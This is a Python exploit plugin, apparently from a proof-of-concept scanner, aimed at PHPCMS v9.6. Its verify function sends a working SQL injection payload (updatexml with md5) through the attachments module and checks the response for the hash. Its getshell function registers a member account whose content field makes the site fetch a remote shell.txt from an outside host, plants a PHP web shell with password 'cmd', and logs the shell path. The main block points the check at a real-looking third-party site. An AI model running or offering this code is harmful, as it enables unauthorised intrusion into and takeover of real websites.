#!/usr/bin/env python
# -*- coding: utf-8 -*-


from ..t  import T

import requests
import random
import string
import hashlib
import re
import threading
 
 

 


class P(T):
    def __init__(self):
        T.__init__(self)
    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackinfo=''):
        arg='http://'+ip+':'+port

        result = {}
        result['result']=False
        try:
            url1 = '{}/index.php?m=wap&amp;c=index&amp;a=int&amp;siteid=1'.format(arg)
            s =requests.Session()
            req = s.get(url1)
            flag = ''.join([random.choice(string.digits) for _ in range(2)])
            flag_hash = hashlib.md5(flag).hexdigest()
            url2 = '{}/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=%26id=%*27%20and%20updatexml%281%2Cconcat%281%2C%28md5%28{}%29%29%29%2C1%29%23%26m%3D1%26f%3Dhaha%26modelid%3D2%26catid%3D7%26'.format(arg,flag)
            cookie = requests.utils.dict_from_cookiejar(s.cookies)
            cookies = re.findall(r"siteid': '(.*?)'",str(cookie))[0]
            data = {"userid_flash":cookies}
            r = s.post(url=url2,data=data)
            a_k = r.headers['Set-Cookie'][61:]
            url3 = '{}/index.php?m=content&amp;c=down&amp;a_k={}'.format(arg,a_k)
            if flag_hash[16:] in s.get(url3).content:
                output(url3,result,'hole')

        except:
            print 'requests error.'
            pass

        return result



     
    def getshell(self,host):
        try:
            url = '%s/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1' % host
            flag = ''.join([random.choice(string.lowercase) for _ in range(8)])
            flags = ''.join([random.choice(string.digits) for _ in range(8)])
            headers = {
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
            'Upgrade-Insecure-Requests':'1',
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0'}
            data = "siteid=1&amp;modelid=11&amp;username={}&amp;password=ad{}min&amp;email={}@cnnetarmy.com&amp;info%5Bcontent%5D=%3Cimg%20src=http://www.cnnetarmy.com/soft/shell.txt?.php#.jpg&gt;&amp;dosubmit=1&amp;protocol=".format(flag,flags,flag)
            r = requests.post(url=url,headers=headers,data=data,timeout=5)
            #print r.content
            shell_path = re.findall(r'lt;img src=(.*?)&gt;',str(r.content))[0]
            print '[*] shell: %s  | pass is: cmd' % shell_path
            with open('sql_ok.txt','a')as tar:
                tar.write(shell_path)
                tar.write('\n')
        except:
            print 'requests error.'
            pass
def output(url,result,label):
    info = url + '  phpcmsv9.6  Vul  '
    result['result']=True
    result['VerifyInfo'] = {}
    result['VerifyInfo']['type']='sqlli inject'
    result['VerifyInfo']['URL'] =url
    result['VerifyInfo']['payload']='/root/github/poccreate/thirdparty/phpcms/phpcms_v9_6.py'
    result['VerifyInfo']['level']=label
    result['VerifyInfo']['result'] =info

if __name__ == '__main__':
    print P().verify(ip='http://yunlai.cn:803/sfdsfds',port='80')

